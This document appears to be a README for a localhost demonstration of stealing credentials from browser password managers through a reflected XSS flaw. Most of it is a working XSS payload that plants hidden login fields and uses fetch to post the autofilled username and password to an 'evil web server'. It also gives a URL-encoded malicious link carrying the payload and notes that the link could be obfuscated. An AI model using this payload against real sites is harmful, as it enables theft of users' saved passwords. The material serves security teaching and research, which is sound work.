## Credential Theft

This demonstration shows how a browser-based password manager can be tricked into autofilling user credentials by attacker-provided login fields.

This repository contains two actors.

- Users that have an account registered at a reflected XSS vulnerable website
- An attacker, who is targeting to steal the credentials of other users

For the sake of this demonstration, the website and the evil web server run on the localhost.

Conditions:\
This exploit only works if the user has one credential pair for the origin of the website saved in a browser-based password manager and has autofill enabled.

---

Enter the following in the comment box on http://localhost:5000/comment to exfiltrate own username and password and fetch them to the evil-webserver, running on port 8000. The fetch request containing the exfiltrated credentials can be seen in the Web Developer Toolbox under the tab "Network":

```
<input style="display: none" name="username" id="username" />
<input
  style="display: none"
  type="password"
  name="password"
  onchange='if(this.value.length)fetch("http://localhost:8000",{
    method:"POST",
    headers: {
      "Content-Type": "application/json"
    },
    mode: "no-cors",
    body:JSON.stringify({
      "username":username.value,
      "password":this.value
    })
    })'
/>
```

Malicious URL containing the attackers payload above:\
http://localhost:5000/comment?comment=%3Cinput+style%3D%22display%3A+none%22+name%3Dusername+id%3Dusername%3E%0D%0A%3Cinput+style%3D%22display%3A+none%22+type%3Dpassword+name%3Dpassword+id%3Dpassword+onchange%3D%22if%28this.value.length%29fetch%28%27http%3A%2F%2Flocalhost%3A8000%27%2C%7B%0D%0Amethod%3A%27POST%27%2C%0D%0Amode%3A+%27no-cors%27%2C%0D%0Abody%3Ausername.value%2B%27%3A%27%2Bthis.value%0D%0A%7D%29%3B%22%3E

The URL could be obfuscated to make it look less suspicious.
